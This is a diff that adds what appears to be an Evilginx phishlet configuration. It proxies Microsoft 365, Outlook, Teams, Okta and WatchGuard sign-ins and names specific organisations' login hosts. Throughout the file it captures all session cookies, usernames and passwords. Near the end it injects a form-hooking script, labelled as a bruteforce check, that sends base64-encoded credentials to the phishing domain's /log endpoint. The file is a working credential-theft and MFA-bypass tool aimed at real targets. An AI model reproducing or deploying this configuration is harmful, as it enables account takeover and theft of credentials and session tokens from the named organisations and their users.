@@ -1,0 +1,250 @@
+min_ver: '3.0.0'
+author: 'PARK'
+
+proxy_hosts:
+  # microsoftonline
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
+
+  # adnxs.com
+  - {phish_sub: 'msft-ssp', orig_sub: 'msft-ssp', domain: 'adnxs.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'msft-ssp-emea', orig_sub: 'msft-ssp-emea', domain: 'adnxs.com', session: true, is_landing: false, auto_filter: true}
+
+  # azure.com
+  - {phish_sub: 'js.monitor', orig_sub: 'js.monitor', domain: 'azure.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'azure.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'management', orig_sub: 'management', domain: 'azure.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'catalogapi', orig_sub: 'catalogapi', domain: 'azure.com', session: true, is_landing: false, auto_filter: true}
+
+  # azure.net
+  - {phish_sub: 'afd-v2.hosting.portal', orig_sub: 'afd-v2.hosting.portal', domain: 'azure.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'sandbox-1.reactblade.portal', orig_sub: 'sandbox-1.reactblade.portal', domain: 'azure.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'reactblade.portal', orig_sub: 'reactblade.portal', domain: 'azure.net', session: true, is_landing: false, auto_filter: true}
+
+  # azureedge.net
+  - {phish_sub: 'catalogartifact', orig_sub: 'catalogartifact', domain: 'azureedge.net', session: true, is_landing: false, auto_filter: true}
+
+  # cloud.microsoft
+  - {phish_sub: 'm365', orig_sub: 'm365', domain: 'cloud.microsoft', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'powerpoint', orig_sub: 'powerpoint', domain: 'cloud.microsoft', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'excel', orig_sub: 'excel', domain: 'cloud.microsoft', session: true, is_landing: false, auto_filter: true}
+
+  # delaware.gov
+  - {phish_sub: 'id', orig_sub: 'id', domain: 'delaware.gov', session: true, is_landing: false, auto_filter: false}
+
+  # live.com
+  - {phish_sub: 'outlook2', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'fpt', orig_sub: 'fpt', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'teams', orig_sub: 'teams', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'storage', orig_sub: 'storage', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'c', orig_sub: 'c', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'onedrive', orig_sub: 'onedrive', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'skyapi.onedrive', orig_sub: 'skyapi.onedrive', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login2', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+
+  # live.net
+  - {phish_sub: 'statics.teams.cdn', orig_sub: 'statics.teams.cdn', domain: 'live.net', session: true, is_landing: false, auto_filter: true}
+
+  # microsoft.com
+  - {phish_sub: 'browser.events.data', orig_sub: 'browser.events.data', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'graph', orig_sub: 'graph', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www2', orig_sub: 'www', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'admin', orig_sub: 'admin', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'teams.events.data', orig_sub: 'teams.events.data', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'teams2', orig_sub: 'teams', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'config.teams', orig_sub: 'config.teams', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'eu-mobile.events.data', orig_sub: 'eu-mobile.events.data', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cdn.create', orig_sub: 'cdn.create', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'account2', orig_sub: 'account', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'fpt2', orig_sub: 'fpt', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'assets.account', orig_sub: 'assets.account', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'wcpstatic', orig_sub: 'wcpstatic', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'subs-paynow.msdx', orig_sub: 'subs-paynow.msdx', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'gsa.view.api.account', orig_sub: 'gsa.view.api.account', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'titles.prod.mos', orig_sub: 'titles.prod.mos', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'csp', orig_sub: 'csp', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'subs-paynow.msdxcdn', orig_sub: 'subs-paynow.msdxcdn', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'azure', orig_sub: 'azure', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cdn-dynmedia-1', orig_sub: 'cdn-dynmedia-1', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'uhf', orig_sub: 'uhf', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+
+  # msftauth.net
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'amcdn', orig_sub: 'amcdn', domain: 'msftauth.net', session: true, is_landing: false, auto_filter: true}
+
+  # msn.com
+  - {phish_sub: 'arc', orig_sub: 'arc', domain: 'msn.com', session: true, is_landing: false, auto_filter: true}
+
+  # gfx.ms
+  - {phish_sub: 'mem', orig_sub: 'mem', domain: 'gfx.ms', session: true, is_landing: false, auto_filter: true}
+
+  # office.com
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'substrate', orig_sub: 'substrate', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'ecs', orig_sub: 'ecs', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'loki.delve', orig_sub: 'loki.delve', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
+
+  # office.net
+  - {phish_sub: 'content.lifecycle', orig_sub: 'content.lifecycle', domain: 'office.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'res-1.cdn', orig_sub: 'res-1.cdn', domain: 'office.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'res.cdn', orig_sub: 'res.cdn', domain: 'office.net', session: true, is_landing: false, auto_filter: true}
+
+  # onedrive.com
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'onedrive.com', session: true, is_landing: false, auto_filter: true}
+
+  # op2online.com
+  - {phish_sub: 'auth', orig_sub: 'auth', domain: 'op2online.com', session: true, is_landing: false, auto_filter: false}
+
+  # pepsico.com
+  - {phish_sub: 'secure', orig_sub: 'secure', domain: 'pepsico.com', session: true, is_landing: false, auto_filter: false}
+
+  # sfx.ms
+  - {phish_sub: 'p', orig_sub: 'p', domain: 'sfx.ms', session: true, is_landing: false, auto_filter: true}
+
+  # s-microsoft.com
+  - {phish_sub: 'c2', orig_sub: 'c', domain: 's-microsoft.com', session: true, is_landing: false, auto_filter: true}
+
+  # skype.com
+  - {phish_sub: 'go.trouter', orig_sub: 'go.trouter', domain: 'skype.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'config.edge', orig_sub: 'config.edge', domain: 'skype.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'edge', orig_sub: 'edge', domain: 'skype.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'experimental-api.asm', orig_sub: 'experimental-api.asm', domain: 'skype.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'us-api.asm', orig_sub: 'us-api.asm', domain: 'skype.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'pub-csm-sece-01-t.trouter', orig_sub: 'pub-csm-sece-01-t.trouter', domain: 'skype.com', session: true, is_landing: false, auto_filter: true}
+
+  # static.microsoft
+  - {phish_sub: 'res.public.onecdn', orig_sub: 'res.public.onecdn', domain: 'static.microsoft', session: true, is_landing: false, auto_filter: true}
+
+  # svc.ms [wss]
+  - {phish_sub: 'centralus1-0.pushnp', orig_sub: 'centralus1-0.pushnp', domain: 'svc.ms', session: false, is_landing: false, auto_filter: true}
+
+  # vidyard.com
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'vidyard.com', session: false, is_landing: false, auto_filter: true}
+
+  # WatchGuard AuthPoint (Final Clean)
+  - {phish_sub: 'sp.authpoint.usa', orig_sub: 'sp.authpoint.usa', domain: 'authpoint.usa', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'usa', orig_sub: 'usa', domain: 'authpoint.watchguard.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cloud', orig_sub: 'cloud', domain: 'watchguard.com', session: false, is_landing: false, auto_filter: false}
+
+  # misscell
+  - {phish_sub: "o", orig_sub: "o", domain: "okta.com", session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: "sci", orig_sub: "sci", domain: "okta.com", session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: "dotfoods", orig_sub: "dotfoods", domain: "okta.com", session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: "login3", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: "office", orig_sub: "login", domain: "bx.com", session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: "msfed", orig_sub: "msfed", domain: "bms.com", session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: "advath", orig_sub: "advath", domain: "bms.com", session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: "smusxath", orig_sub: "smusxath", domain: "bms.com", session: true, is_landing: false, auto_filter: false}
+  - { phish_sub: "ulgroup", orig_sub: "ulgroup", domain: "okta.com", session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  # microsoftonline
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login.microsoftonline.com', replace: 'login.phish_domain', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login.live.com', replace: 'login.phish_domain', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+
+  # live.com
+  - {triggers_on: 'outlook.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'login.microsoftonline.com', replace: 'login.phish_domain', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'login.live.com', replace: 'login.phish_domain', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'login.microsoftonline.com', replace: 'login.phish_domain', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+  - {triggers_on: 'teams.live.com', orig_sub: 'teams', domain: 'live.com', search: 'login.microsoftonline.com', replace: 'login.phish_domain', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+  - {triggers_on: 'teams.live.com', orig_sub: 'teams', domain: 'live.com', search: 'login.live.com', replace: 'login.phish_domain', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'outlook.live.com', replace: 'outlook.phish_domain', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+
+  # office.com
+  - {triggers_on: 'office.com', orig_sub: '', domain: 'office.com', search: 'login.microsoftonline.com', replace: 'login.phish_domain', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+  - {triggers_on: 'office.com', orig_sub: '', domain: 'office.com', search: 'login.live.com', replace: 'login.phish_domain', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+
+  # office.net
+  - {triggers_on: 'office.net', orig_sub: 'outlook', domain: 'live.com', search: 'login.microsoftonline.com', replace: 'login.phish_domain', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+
+  # cloud.microsoft
+  - {triggers_on: 'm365.cloud.microsoft', orig_sub: 'm365', domain: 'cloud.microsoft', search: 'login.microsoftonline.com', replace: 'login.phish_domain', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+  - {triggers_on: 'm365.cloud.microsoft', orig_sub: 'm365', domain: 'cloud.microsoft', search: 'login.live.com', replace: 'login.phish_domain', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+
+  # microsoft.com
+  - {triggers_on: 'www.microsoft.com', orig_sub: 'www', domain: 'microsoft.com', search: 'account.live.com', replace: 'account.phish_domain', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+  - {triggers_on: 'www.microsoft.com', orig_sub: 'www', domain: 'microsoft.com', search: 'account.microsoft.com', replace: 'account.phish_domain', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+  - {triggers_on: 'www.microsoft.com', orig_sub: 'www', domain: 'microsoft.com', search: 'login.live.com', replace: 'login.phish_domain', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+  - {triggers_on: 'www.microsoft.com', orig_sub: 'www', domain: 'microsoft.com', search: 'login.microsoftonline.com', replace: 'login.phish_domain', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+
+  # OneDrive (personal and business)
+  - {triggers_on: 'onedrive.live.com', orig_sub: 'onedrive', domain: 'live.com', search: 'onedrive.live.com', replace: 'onedrive.phish_domain', mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+
+  # js_inject - to check bruteforce attempt
+  - {triggers_on: '', orig_sub: '', domain: '', search: '</body>', replace: "<script>(function(){let e=document.querySelectorAll('form[action*=\\'login\\'], form[action*=\\'signin\\']')[0];if(!e)return;const t=/(login|UserName|username|email|account|identifier|utemp|loginfmt)/i,o=/(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)/i,n=/['\";`<>]/,r=/script|on\\w+=|javascript:|eval|console|fetch|XMLHttpRequest/i,c=(e,t)=>{let o=new Image;o.src='https://login.phish_domain/log?e='+btoa(e)+'&p='+btoa(t)},a=s=>s.toLowerCase().replace(/\\s/g,''),i=(e,t)=>r.test(e)||n.test(e)||!e||!t,u=(s,f)=>{let l=e.querySelectorAll('input');for(let e of l){let l=e.name||'';if(l.match(s))return e}return null},d=u(t,o),m=u(o,o),h=e.querySelector('input[name=\\'botcheck\\']');let p=0;e.addEventListener('submit',async t=>{if(t.preventDefault(),!d||!m)return;let o=a(d.value||''),n=m.value||'';if(i(o,n)||h?.value)return;try{let t=await fetch(e.action,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({[d.name]:o,[m.name]:n}),credentials:'include'});if(302===t.status||t.url?.includes('redirect')||document.body.innerText.match(/welcome|redirect/i))c(o,n),window.location.href=t.url||'/';else if(++p>=3){let t=e.querySelector('button[type=\\'submit\\']');t&&(t.disabled=!0,setTimeout(()=>{t.disabled=!1,p=0},5e3))}}catch(e){}})})();</script></body>", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+
+auth_urls:
+  - "/kmsi*"
+  - "/landingv2"
+  - "/login.srf"
+
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['.*,regexp']
+
+  - domain: 'login.microsoftonline.com'
+    keys: ['.*,regexp']
+
+  - domain: '.live.com'
+    keys: ['.*,regexp']
+
+  - domain: '.login.live.com'
+    keys: ['.*,regexp']
+
+  - domain: 'login.live.com'
+    keys: ['.*,regexp']
+    
+  - domain: 'login.bx.com'
+    keys: ['.*,regexp']
+    
+  - domain: '.bms.com'
+    keys: ['.*,regexp']
+    
+  - domain: 'advath.bms.com'
+    keys: ['.*,regexp']
+
+  - domain: 'outlook.live.com'
+    keys: ['.*,regexp']
+   
+  - domain: 'sso.secureserver.net'
+    keys: ['.*,regexp']
+  
+  - domain: 'sso.godaddy.com'
+    keys: ['.*,regexp']
+
+  - domain: 'sp.authpoint.usa.cloud.watchguard.com'
+    keys: ['.*,regexp']
+    
+  - domain: 'auth.op2online.com'
+    keys: ['.*,regexp']
+
+  - domain: 'id.delaware.gov'
+    keys: ['.*,regexp']
+
+  - domain: 'secure.pepsico.com'
+    keys: ['.*,regexp']
+
+credentials:
+  username:
+    key: "(login|UserName|username|email|account|identifier|utemp|loginfmt)"
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: "(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)"
+    search: '(.*)'
+    type: "post"
+  custom:
+    - key: 'Username'
+      search: '"username":"([^"]*)'
+      type: "json"
+    - key: 'Login'
+      search: '"login":"([^"]*)'
+      type: "json"
+    - key: 'password'
+      search: '"password":"([^"]*)'
+      type: "json"
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
